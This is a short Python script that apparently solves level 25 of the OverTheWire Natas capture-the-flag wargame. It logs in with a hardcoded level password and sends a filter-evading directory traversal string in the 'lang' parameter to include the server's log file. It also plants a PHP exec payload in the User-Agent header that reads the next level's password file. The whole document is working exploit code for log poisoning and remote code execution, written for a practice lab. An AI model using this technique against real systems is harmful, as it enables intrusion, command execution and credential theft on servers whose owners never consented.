#!/usr/local/bin/python3
import requests
import re
import codecs

username = "natas25"
password = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"

url = 'http://%s.natas.labs.overthewire.org/?debug' % username

s = requests.session()

response = s.get(url, auth=(username, password))
id = response.cookies["PHPSESSID"]

data = {"lang": '..././..././..././..././..././var/www/natas/natas25/logs/natas25_%s.log' % id}

headers = {"User-Agent": '<?php echo exec("cat ../../../../../etc/natas_webpass/natas26") ?>'}

response = s.post(url, params=data, auth=(username, password), cookies={'PHPSESSID': id}, headers=headers)
print(re.findall('] (.*) "Directory traversal attempt! fixing request."', response.text)[0])
# print(response.text)
